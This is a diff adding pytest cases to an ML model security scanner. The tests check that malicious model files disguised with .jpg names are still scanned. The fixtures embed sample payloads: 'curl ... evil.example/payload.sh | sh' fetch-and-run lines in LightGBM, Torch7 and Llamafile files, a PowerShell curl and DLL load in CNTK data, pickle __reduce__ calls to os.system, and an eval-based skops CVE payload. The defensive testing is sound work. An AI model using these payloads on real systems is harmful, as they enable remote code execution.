@@ -15,10 +15,19 @@ from typing import cast
 import pytest
 
 from modelaudit.core import _is_huggingface_cache_file, determine_exit_code, scan_file, scan_model_directory_or_file
+from modelaudit.utils.file.detection import LLAMAFILE_ROUTE_SCAN_BYTES, LLAMAFILE_ROUTE_TAIL_SCAN_BYTES
 from modelaudit.utils.file.filtering import _ZIP_MEMBER_SNIFF_LIMIT
+from modelaudit.utils.tensorflow_compat import has_tensorflow_protobuf_stubs as _has_tf_protos
+from tests.helpers import create_mock_mxnet_symbol
+
+
+def _require_tf_protos() -> None:
+    if not _has_tf_protos():
+        pytest.skip("TensorFlow protobuf stubs unavailable")
 
 
 def _build_malicious_tf_metagraph() -> bytes:
+    _require_tf_protos()
     import modelaudit.protos  # noqa: F401
 
     meta_graph_pb2 = importlib.import_module("tensorflow.core.protobuf.meta_graph_pb2")
@@ -32,6 +41,7 @@ def _build_malicious_tf_metagraph() -> bytes:
 
 
 def _build_malicious_tf_savedmodel() -> bytes:
+    _require_tf_protos()
     import modelaudit.protos  # noqa: F401
 
     saved_model_pb2 = importlib.import_module("tensorflow.core.protobuf.saved_model_pb2")
@@ -71,6 +81,25 @@ def _corrupt_zip_member_crc(path: Path, member_name: str) -> None:
         central_offset = name_end + extra_length + comment_length
 
     path.write_bytes(data)
+
+
+def _write_malicious_cntk(path: Path, include_structure: bool = True) -> None:
+    prefix = b"\x08\x01\x12\x11\x0a\x07version\x12\x06\x08\x01\x10\x03(\x02\x12\x09\x0a\x03uid\x12\x02ab"
+    structure = b" CompositeFunction primitive_functions " if include_structure else b""
+    payload = b" native_user_function loadlibrary C:\\temp\\evil.dll powershell -c curl http://evil.example/p.sh "
+    path.write_bytes(prefix + structure + payload)
+
+
+def _write_malicious_lightgbm(path: Path, valid: bool = True) -> None:
+    body = "tree=0\nversion=v4\nnum_class=1\n"
+    if valid:
+        body += (
+            "num_tree_per_iteration=1\nmax_feature_idx=2\ntree_sizes=12\nnum_leaves=2\n"
+            "split_feature=0\nleaf_value=0.1 0.2\n"
+            "metadata=os.system('curl https://collector.evil.example/payload.sh | sh')\n"
+            "callback_url=https://collector.evil.example/payload.sh\n"
+        )
+    path.write_text(body, encoding="utf-8")
 
 
 class TestDirectoryFileFiltering:
@@ -268,6 +297,42 @@ class TestDirectoryFileFiltering:
         assert determine_exit_code(results) == 1
         assert any("PyFunc operation detected" in issue.message for issue in results.issues)
 
+    def test_disguised_cntk_with_skipped_extension_is_scanned(self, tmp_path: Path) -> None:
+        disguised_payload = tmp_path / "cntk.jpg"
+        _write_malicious_cntk(disguised_payload)
+
+        results = scan_model_directory_or_file(str(tmp_path))
+
+        assert results["files_scanned"] == 1
+        assert "cntk" in results.scanner_names
+        assert any(issue.severity.value == "critical" for issue in results.issues)
+
+    def test_disguised_cntk_near_match_remains_skipped(self, tmp_path: Path) -> None:
+        near_match = tmp_path / "cntk-near-match.jpg"
+        _write_malicious_cntk(near_match, include_structure=False)
+
+        results = scan_model_directory_or_file(str(tmp_path))
+
+        assert results["files_scanned"] == 0
+
+    def test_disguised_lightgbm_with_skipped_extension_is_scanned(self, tmp_path: Path) -> None:
+        disguised_payload = tmp_path / "lightgbm.jpg"
+        _write_malicious_lightgbm(disguised_payload)
+
+        results = scan_model_directory_or_file(str(tmp_path))
+
+        assert results["files_scanned"] == 1
+        assert "lightgbm" in results.scanner_names
+        assert any(issue.severity.value == "critical" for issue in results.issues)
+
+    def test_disguised_lightgbm_near_match_remains_skipped(self, tmp_path: Path) -> None:
+        near_match = tmp_path / "lightgbm-near-match.jpg"
+        _write_malicious_lightgbm(near_match, valid=False)
+
+        results = scan_model_directory_or_file(str(tmp_path))
+
+        assert results["files_scanned"] == 0
+
     @pytest.mark.parametrize("filename", [".payload", "Makefile", "package.json", "CHANGELOG"])
     def test_disguised_pickle_with_default_hidden_or_basename_skip_is_scanned(
         self,
@@ -300,6 +365,176 @@ class TestDirectoryFileFiltering:
         results = scan_model_directory_or_file(str(tmp_path))
 
         assert results["files_scanned"] == 0
+
+    def test_disguised_malicious_mxnet_symbol_with_skipped_extension_is_scanned(self, tmp_path: Path) -> None:
+        """Directory scans should preserve renamed MXNet symbol graphs for analysis."""
+        disguised_symbol = create_mock_mxnet_symbol(
+            tmp_path / "model.jpg",
+            custom_library="../../tmp/libevil.so",
+        )
+
+        results = scan_model_directory_or_file(str(tmp_path))
+
+        assert results["files_scanned"] == 1
+        assert "mxnet" in results.scanner_names
+        assert any(str(disguised_symbol) in (issue.location or "") for issue in results.issues)
+
+    def test_disguised_torch7_with_skipped_extension_is_scanned(self, tmp_path: Path) -> None:
+        """Directory scans should preserve signature-valid Torch7 payloads despite misleading suffixes."""
+        disguised_torch7 = tmp_path / "payload.jpg"
+        disguised_torch7.write_bytes(
+            b"4\n1\n3\nV 1\n13\nnn.Sequential\n"
+            b"4\n2\n3\nV 1\n17\ntorch.FloatTensor\n"
+            b"cmd = os.execute('curl https://evil.example/payload.sh | sh')\n"
+        )
+
+        results = scan_model_directory_or_file(str(tmp_path))
+
+        assert results["files_scanned"] == 1
+        assert "torch7" in results.scanner_names
+        assert any("payload.jpg" in (issue.location or "") for issue in results.issues)
+
+    def test_disguised_torch_source_near_match_remains_skipped(self, tmp_path: Path) -> None:
+        """Source files naming torch modules must not route as serialized Torch7."""
+        source_near_match = tmp_path / "source.jpg"
+        source_near_match.write_text("import torch\nimport torch.nn as nn\n\nclass Model(nn.Module):\n    pass\n")
+
+        results = scan_model_directory_or_file(str(tmp_path))
+
+        assert results["files_scanned"] == 0
+
+    def test_disguised_llamafile_with_skipped_extension_is_scanned(self, tmp_path: Path) -> None:
+        """Directory scans should preserve executable Llamafiles despite misleading suffixes."""
+        disguised_llamafile = tmp_path / "payload.jpg"
+        disguised_llamafile.write_bytes(
+            b"\x7fELF"
+            + b"\x02\x01\x01\x00"
+            + b"\x00" * 56
+            + b"llamafile runtime\nbash -c curl http://evil.example/payload.sh"
+        )
+
+        results = scan_model_directory_or_file(str(tmp_path))
+
+        assert results["files_scanned"] == 1
+        assert "llamafile" in results.scanner_names
+        assert any("payload.jpg" in (issue.location or "") for issue in results.issues)
+
+    def test_disguised_generic_executable_near_match_remains_skipped(self, tmp_path: Path) -> None:
+        """Content routing must require the Llamafile marker, not only an executable header."""
+        generic_executable = tmp_path / "tool.jpg"
+        generic_executable.write_bytes(b"\x7fELF" + b"\x02\x01\x01\x00" + b"\x00" * 56 + b"llama-file runtime")
+
+        results = scan_model_directory_or_file(str(tmp_path))
+
+        assert results["files_scanned"] == 0
+
+    def test_disguised_llamafile_probe_failure_is_not_skipped(
+        self,
+        tmp_path: Path,
+        monkeypatch: pytest.MonkeyPatch,
+    ) -> None:
+        """An unreadable content probe must not turn a candidate into a clean skip."""
+        payload = tmp_path / "payload.jpg"
+        payload.write_bytes(b"\x7fELF" + b"\x00" * 60 + b"llamafile runtime")
+
+        def raise_os_error(_path: Path, _marker: bytes, _limit: int) -> bool:
+            raise OSError("synthetic marker probe failure")
+
+        monkeypatch.setattr("modelaudit.utils.file.detection._contains_casefolded_marker_in_prefix", raise_os_error)
+
+        results = scan_model_directory_or_file(str(tmp_path))
+
+        assert results["files_scanned"] == 1
+        assert results.file_metadata[str(payload)]["scan_outcome"] == "inconclusive"
+        assert determine_exit_code(results) == 2
+
+    def test_disguised_llamafile_zip_polyglot_preserves_nested_findings(self, tmp_path: Path) -> None:
+        """A renamed executable ZIP wrapper must retain recursive member scanning."""
+
+        class DangerousPayload:
+            def __reduce__(self) -> tuple[object, tuple[str]]:
+                import os as os_module
+
+                return (os_module.system, ("echo directory-llamafile-zip-test",))
+
+        payload = tmp_path / "payload.jpg"
+        with zipfile.ZipFile(payload, "w") as archive:
+            archive.writestr("payload.pkl", pickle.dumps(DangerousPayload()))
+        payload.write_bytes(b"\x7fELF" + b"\x00" * 60 + b"llamafile runtime\n" + payload.read_bytes())
+
+        results = scan_model_directory_or_file(str(tmp_path))
+
+        assert results["files_scanned"] == 1
+        assert "llamafile" in results.scanner_names
+        assert any(issue.severity.name == "CRITICAL" for issue in results.issues)
+
+    def test_disguised_llamafile_skops_polyglot_preserves_cve_findings(self, tmp_path: Path) -> None:
+        """Subtype-owned CVE checks must survive executable wrapper routing."""
+        payload = tmp_path / "skops-cve.jpg"
+        with zipfile.ZipFile(payload, "w") as archive:
+            archive.writestr(
+                "schema.json",
+                '{"__loader__": "OperatorFuncNode", "__module__": "builtins", "__class__": "eval", '
+                '"_skops_version": "0.11.0", "content": {}}',
+            )
+        payload.write_bytes(b"\x7fELF" + b"\x00" * 60 + b"llamafile runtime\n" + payload.read_bytes())
+
+        results = scan_model_directory_or_file(str(tmp_path))
+
+        assert results["files_scanned"] == 1
+        assert "llamafile" in results.scanner_names
+        assert any(issue.rule_code == "CVE-2025-54412" or "CVE-2025-54412" in issue.message for issue in results.issues)
+
+    def test_executable_zip_with_out_of_window_llamafile_marker_preserves_nested_findings(self, tmp_path: Path) -> None:
+        """ZIP structure must preserve coverage independently of bounded marker routing."""
+
+        class DangerousPayload:
+            def __reduce__(self) -> tuple[object, tuple[str]]:
+                import os as os_module
+
+                return (os_module.system, ("echo directory-late-marker-zip-test",))
+
+        payload = tmp_path / "payload.jpg"
+        with zipfile.ZipFile(payload, "w") as archive:
+            archive.writestr("payload.pkl", pickle.dumps(DangerousPayload()))
+        payload.write_bytes(
+            b"\x7fELF"
+            + b"\x00" * 60
+            + b"A" * LLAMAFILE_ROUTE_SCAN_BYTES
+            + b"llamafile runtime"
+            + b"B" * LLAMAFILE_ROUTE_TAIL_SCAN_BYTES
+            + payload.read_bytes()
+        )
+
+        results = scan_model_directory_or_file(str(tmp_path))
+
+        assert results["files_scanned"] == 1
+        assert "zip" in results.scanner_names
+        assert any(issue.severity.name == "CRITICAL" for issue in results.issues)
+
+    def test_out_of_window_executable_skops_zip_preserves_cve_findings(self, tmp_path: Path) -> None:
+        """Late-marker executable ZIPs still require subtype-owned checks."""
+        payload = tmp_path / "skops-late-marker.jpg"
+        with zipfile.ZipFile(payload, "w") as archive:
+            archive.writestr(
+                "schema.json",
+                '{"__loader__": "OperatorFuncNode", "__module__": "builtins", "__class__": "eval", '
+                '"_skops_version": "0.11.0", "content": {}}',
+            )
+        payload.write_bytes(
+            b"\x7fELF"
+            + b"\x00" * 60
+            + b"A" * LLAMAFILE_ROUTE_SCAN_BYTES
+            + b"llamafile runtime"
+            + b"B" * LLAMAFILE_ROUTE_TAIL_SCAN_BYTES
+            + payload.read_bytes()
+        )
+
+        results = scan_model_directory_or_file(str(tmp_path))
+
+        assert results["files_scanned"] == 1
+        assert "zip" in results.scanner_names
+        assert any("CVE-2025-54412" in issue.message for issue in results.issues)
 
     def test_disguised_executorch_zip_with_skipped_extension_is_scanned(self, tmp_path: Path) -> None:
         """Directory scans should preserve disguised ZIPs that contain supported ExecuTorch payloads."""
